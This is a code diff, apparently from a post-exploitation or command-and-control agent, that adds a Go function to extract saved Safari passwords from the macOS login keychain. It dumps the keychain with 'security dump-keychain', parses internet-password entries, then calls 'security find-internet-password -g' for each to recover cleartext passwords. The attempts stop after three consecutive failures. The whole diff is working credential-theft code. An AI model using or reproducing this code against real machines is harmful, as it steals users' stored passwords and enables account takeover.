@@ -3,6 +3,7 @@
 package commands
 
 import (
+	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/sha1"
@@ -12,6 +13,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"fawkes/pkg/structs"
 
@@ -364,6 +366,176 @@ func browserChromiumPasswords(args browserArgs) structs.CommandResult {
 	}
 
 	return successResult(sb.String())
+}
+
+// browserSafariPasswords extracts saved internet passwords from the macOS Keychain.
+// Safari stores passwords directly in the login keychain as "inet" class items.
+func browserSafariPasswords() ([]safariPasswordEntry, []string) {
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	out, err := exec.CommandContext(ctx, "security", "dump-keychain").CombinedOutput()
+	if err != nil {
+		return nil, []string{fmt.Sprintf("Safari: keychain dump failed: %v", err)}
+	}
+
+	var entries []safariPasswordEntry
+	var errors []string
+
+	blocks := splitSafariKeychainBlocks(string(out))
+	for _, block := range blocks {
+		class := extractSafariField(block, "class:")
+		if class != "\"inet\"" {
+			continue
+		}
+
+		server := extractSafariAttr(block, "\"srvr\"")
+		account := extractSafariAttr(block, "\"acct\"")
+		if server == "" && account == "" {
+			continue
+		}
+
+		proto := extractSafariAttr(block, "\"ptcl\"")
+		port := extractSafariAttr(block, "\"port\"")
+
+		url := buildSafariURL(proto, server, port)
+
+		entries = append(entries, safariPasswordEntry{
+			URL:      url,
+			Username: account,
+		})
+	}
+
+	if len(entries) == 0 {
+		return entries, errors
+	}
+
+	consecutiveFails := 0
+	for i, e := range entries {
+		if consecutiveFails >= 3 {
+			break
+		}
+
+		cmdArgs := []string{"find-internet-password", "-g"}
+		if e.URL != "" {
+			server := serverFromURL(e.URL)
+			if server != "" {
+				cmdArgs = append(cmdArgs, "-s", server)
+			}
+		}
+		if e.Username != "" {
+			cmdArgs = append(cmdArgs, "-a", e.Username)
+		}
+
+		ctx2, cancel2 := context.WithTimeout(context.Background(), 3*time.Second)
+		pwOut, pwErr := exec.CommandContext(ctx2, "security", cmdArgs...).CombinedOutput()
+		cancel2()
+		if pwErr != nil {
+			consecutiveFails++
+			continue
+		}
+
+		for _, line := range strings.Split(string(pwOut), "\n") {
+			if strings.HasPrefix(line, "password: ") {
+				val := strings.TrimPrefix(line, "password: ")
+				val = strings.Trim(val, "\"")
+				if val != "" && !strings.HasPrefix(val, "0x") {
+					entries[i].Password = val
+					consecutiveFails = 0
+				} else {
+					consecutiveFails++
+				}
+				break
+			}
+		}
+	}
+
+	return entries, errors
+}
+
+type safariPasswordEntry struct {
+	URL      string
+	Username string
+	Password string
+}
+
+func splitSafariKeychainBlocks(output string) []string {
+	lines := strings.Split(output, "\n")
+	var blocks []string
+	var current strings.Builder
+	for _, line := range lines {
+		if strings.HasPrefix(line, "keychain:") && current.Len() > 0 {
+			blocks = append(blocks, current.String())
+			current.Reset()
+		}
+		current.WriteString(line)
+		current.WriteByte('\n')
+	}
+	if current.Len() > 0 {
+		blocks = append(blocks, current.String())
+	}
+	return blocks
+}
+
+func extractSafariField(block, prefix string) string {
+	for _, line := range strings.Split(block, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.HasPrefix(trimmed, prefix) {
+			return strings.TrimSpace(strings.TrimPrefix(trimmed, prefix))
+		}
+	}
+	return ""
+}
+
+func extractSafariAttr(block, attrName string) string {
+	for _, line := range strings.Split(block, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.Contains(trimmed, attrName) && strings.Contains(trimmed, "=") {
+			parts := strings.SplitN(trimmed, "=", 2)
+			if len(parts) == 2 {
+				val := strings.TrimSpace(parts[1])
+				val = strings.Trim(val, "\"")
+				if val == "<NULL>" || val == "0x00000000" {
+					return ""
+				}
+				return val
+			}
+		}
+	}
+	return ""
+}
+
+func buildSafariURL(proto, server, port string) string {
+	scheme := "https"
+	protoMap := map[string]string{
+		"htps": "https", "http": "http", "ftp ": "ftp", "ftps": "ftps",
+	}
+	if mapped, ok := protoMap[proto]; ok {
+		scheme = mapped
+	}
+
+	url := scheme + "://" + server
+	if port != "" && port != "0" {
+		defaultPorts := map[string]string{"https": "443", "http": "80", "ftp": "21"}
+		if defPort, ok := defaultPorts[scheme]; !ok || port != defPort {
+			url += ":" + port
+		}
+	}
+	return url
+}
+
+func serverFromURL(url string) string {
+	s := url
+	if idx := strings.Index(s, "://"); idx >= 0 {
+		s = s[idx+3:]
+	}
+	if idx := strings.Index(s, ":"); idx >= 0 {
+		s = s[:idx]
+	}
+	if idx := strings.Index(s, "/"); idx >= 0 {
+		s = s[:idx]
+	}
+	return s
 }
 
 // Ensure sql.NullString is importable (used by openBrowserDB)
